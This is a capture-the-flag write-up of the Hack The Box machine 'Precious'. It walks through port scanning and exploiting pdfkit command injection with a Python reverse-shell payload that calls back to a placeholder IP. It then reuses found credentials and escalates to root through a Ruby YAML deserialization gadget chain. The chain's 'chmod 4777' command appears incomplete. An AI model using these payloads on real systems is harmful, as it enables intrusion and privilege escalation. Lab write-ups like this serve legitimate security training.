 theme: minima
 
 ![image](https://user-images.githubusercontent.com/87700008/205619578-28e109d5-9ede-4b75-95c0-fb74bc635c26.png)

https://app.hackthebox.com/machines/Precious

**Enumeration**:

_Rustscan_:

Started with a qucik Rustscan, found 3 open ports :

![image](https://user-images.githubusercontent.com/87700008/205620631-e8bad937-e8da-432e-b776-fab52239c64b.png)


    sudo rustscan -a 10.10.11.189 -- -A -T4 -vv -oN precious_nmap
    
    Open 10.10.11.189:22
    Open 10.10.11.189:80
    Open 10.10.11.189:8000
    
In the scan results there is a domain observed, i.e. http://precious.htb/

![image](https://user-images.githubusercontent.com/87700008/205621054-4212556d-c02c-4eeb-b170-41b379915db7.png)

So, to consolidate all results:

    On ports 80, nginx/1.18.0 is running
    On port 8000, SimpleHTTPServer 0.6 (Python 3.9.2) is running
    
Added the domain to the /etc/hosts file. After adding the domain browsed through that domain & found there is a website running to convert web page to PDF.
![image](https://user-images.githubusercontent.com/87700008/205623888-22706343-617f-434a-aec1-f55a1e35af90.png)

_Gobuster:_

Scanned the subdomain & vhost using gobuster but nothing found in both the scans:

![image](https://user-images.githubusercontent.com/87700008/205679805-8aa80909-6b18-4a91-ad67-c7b4896bae5d.png)
![image](https://user-images.githubusercontent.com/87700008/205679904-2647b99f-613f-4905-b878-5c9a297929c6.png)

As I didn't get any result from the gobuster scanning I tried some manual enumertaion & checked for the html source but nothing found there are well.ðŸ˜•

Then I thought to play with the webpage & started my own SimpleHttpServer on port 80 & in the parameter part I gave my own http server IP & clicked on submit.
Then the page redirected me to the PDF page of my directory :

![image](https://user-images.githubusercontent.com/87700008/205709502-88986f4c-3997-4ca4-a08c-ce4d9972df65.png)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Initial access:**

I downloaded the file from the page & checked for the metadata where I found the creator as "Generated by pdfkit v0.8.6":
![image](https://user-images.githubusercontent.com/87700008/205710041-713e2058-ed8f-45d4-9302-dd02e32798b1.png)
![image](https://user-images.githubusercontent.com/87700008/205710140-e3420cfd-24ae-443f-891b-4ca04621ff29.png)

I quickly searched for the exploit of "pdfkit 0.8.6" & landed on the page of an article with the PoC pubished by snyk mentioning the command injection vulnerability in the versions lower than 0.8.7, ref : https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
![image](https://user-images.githubusercontent.com/87700008/205710574-556b8712-4458-49f9-94fc-d3af74763033.png)

So as per the article I tried the exploit from myself in this webpage & it's working :

![image](https://user-images.githubusercontent.com/87700008/205711050-746a9e5b-fbff-470e-a021-0cde0a578a0f.png)
![image](https://user-images.githubusercontent.com/87700008/205711105-ae626667-8af6-4d4e-8b58-cfb0d1506e9b.png)
 
 At this point we are confirmed that the page is vulnerbale to the command injection vulnerability.

 I tried different payload here for reverse shell & python3 payload worked for me :
 
    http://IP/?name='%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

And I received the reverse shell :

![image](https://user-images.githubusercontent.com/87700008/205716608-5fa1a95c-a9ef-4fe5-91ba-37f75d7e0828.png)

Stablized the reverse shell:

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export term=XTERM
    stty raw -echo; fg 
    
After searching many directories I found a directory located in ruby user folder name : '.bundle' in which I found another user 'henry' credentials:

![image](https://user-images.githubusercontent.com/87700008/205719193-a3d77efd-1d3e-402f-af69-3cfbdcf03a2e.png)

_User flag_ :

Using those credentials I quickly tried SSH & logged in successfully & retrieved the user flag ðŸ™‚(pwn3d!)

![image](https://user-images.githubusercontent.com/87700008/205719767-ab5f9b34-0345-4c98-a65e-9659b8be91d9.png)
![image](https://user-images.githubusercontent.com/87700008/205719911-4e5caa98-3a16-49f9-ac23-0d8f0b7780c9.png)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Priv Esc:**

Now, as always I started with the manual enumeration & ran 'sudo -l', I got this :

    User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
    
Then I checked for the file content present in '/opt/update_dependencies.rb'. I am confused here at this point as there isn't anything present here whhich looks much helpful. 
Then with lot of searching I found a blog where it's mentioned some flaw in "Yaml.load" parameter which is also available in our file :

![image](https://user-images.githubusercontent.com/87700008/205723673-9d35da55-4701-4d33-be5b-50899f708684.png)
ref : https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

This is vulnerable to "Yaml deserialization" attack:
![image](https://user-images.githubusercontent.com/87700008/205724218-37fec72d-5e49-40c9-b2d6-b6e56816cb6b.png)

I also found a PoC, ref : https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml
So, I created a file name 'dependencies.yml' & used this code taken from the PoC :

    - !ruby/object:Gem::Installer
    i: x
    - !ruby/object:Gem::SpecFetcher
    i: y
    - !ruby/object:Gem::Requirement
    requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod 4777"
         method_id: :resolve

_Root flag:_

And, ran the command :

    sudo /usr/bin/ruby /opt/update_dependencies.rb
    /bin/bash -p
    
This provided us the bash shell with root access ðŸ™‚(pwn3d!)

![image](https://user-images.githubusercontent.com/87700008/205726452-39f4a812-6e1c-41b0-b8db-f4b09089985f.png)
